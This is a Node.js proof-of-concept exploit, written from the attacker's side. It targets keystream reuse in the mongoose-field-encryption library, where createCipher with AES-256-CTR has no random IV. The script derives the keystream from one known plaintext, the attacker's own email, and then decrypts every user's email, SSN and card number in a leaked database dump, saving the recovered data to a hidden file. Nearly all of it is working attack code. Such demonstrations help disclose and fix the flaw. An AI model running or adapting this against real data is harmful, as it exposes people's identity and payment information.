#!/usr/bin/env node
'use strict'
/*
 * ATTACKER side — recovers EVERY encrypted field in a leaked mongoose-field-encryption
 * database WITHOUT knowing the secret.
 *
 * Why it works:  encryptAes256Ctr() does `crypto.createCipher('aes-256-ctr', secret)`.
 * `createCipher` derives BOTH the key and the IV/initial counter deterministically from
 * the secret (OpenSSL EVP_BytesToKey) — there is no random IV/nonce. AES-CTR turns the
 * cipher into a keystream generator: ciphertext = plaintext XOR keystream. Because the
 * key AND the counter are fixed, the SAME keystream encrypts every field of every
 * document. That is a classic two-time pad:
 *
 *        C_a XOR C_b  ==  P_a XOR P_b          (secret cancels out)
 *
 * A single known plaintext (the attacker is a registered user, so they know their OWN
 * record) reveals the keystream, which then decrypts everyone else's data.
 *
 * This script reads ONLY encrypted_db.json. It never imports the library and never
 * sees the secret.
 */
const fs = require('fs')

const db = JSON.parse(fs.readFileSync('encrypted_db.json', 'utf8'))
const recs = db.records

const hexToBuf = h => Buffer.from(h, 'hex')
const xor = (a, b) => { const n = Math.min(a.length, b.length); const o = Buffer.alloc(n); for (let i = 0; i < n; i++) o[i] = a[i] ^ b[i]; return o }

// ---------------------------------------------------------------------------
// 1) PROVE keystream reuse without knowing any plaintext:
//    for two same-format fields (e.g. two SSNs "SSN:xxx-xx-xxxx"), C_a^C_b must
//    be zero wherever the plaintexts agree (here the shared "SSN:" prefix).
console.log('[1] Detecting two-time-pad reuse (no secret, no plaintext needed):')
const s1 = hexToBuf(recs[0].ssn_enc), s2 = hexToBuf(recs[1].ssn_enc)
const d = xor(s1, s2)
console.log(`    C(ssn#1) ^ C(ssn#2) = ${d.toString('hex')}`)
console.log(`    -> leading bytes are 00 because both plaintexts start with "SSN:" (prefix cancels)`)
console.log(`    -> confirms a FIXED keystream is reused for every field.\n`)

// ---------------------------------------------------------------------------
// 2) Known-plaintext recovery. The attacker is user #3 (Mallory): they know their own
//    email because they typed it at signup, and they can see its ciphertext in the dump.
const me = recs.find(r => r.id === 3)
const myEmailPlain = Buffer.from('attacker.mallory@evilcorp.test', 'utf8') // attacker's OWN datum
const myEmailCipher = hexToBuf(me.email_enc)

// keystream = C XOR P  (valid for the overlapping length)
const keystream = xor(myEmailCipher, myEmailPlain)
console.log(`[2] Recovered ${keystream.length} keystream bytes from the attacker's own known email.`)
console.log(`    keystream = ${keystream.toString('hex')}\n`)

// ---------------------------------------------------------------------------
// 3) Decrypt everyone's fields with the recovered keystream — no secret used.
const decField = hex => {
  const c = hexToBuf(hex)
  if (c.length > keystream.length) return xor(c, keystream).toString('utf8') + ` …(+${c.length - keystream.length}B need more keystream)`
  return xor(c, keystream).toString('utf8')
}

console.log('[3] Decrypting the ENTIRE database with the recovered keystream (no secret):')
console.log('    ' + 'id'.padEnd(4) + 'email'.padEnd(34) + 'ssn'.padEnd(18) + 'card')
const recovered = []
for (const r of recs) {
  const email = decField(r.email_enc)
  const ssn = decField(r.ssn_enc)
  const card = decField(r.card_enc)
  recovered.push({ id: r.id, email, ssn, card })
  console.log('    ' + String(r.id).padEnd(4) + email.padEnd(34) + ssn.padEnd(18) + card)
}

fs.writeFileSync('.recovered.json', JSON.stringify(recovered, null, 2))
console.log('\n[+] Done. Full PII recovered from ciphertext alone, no secret, pure XOR.')
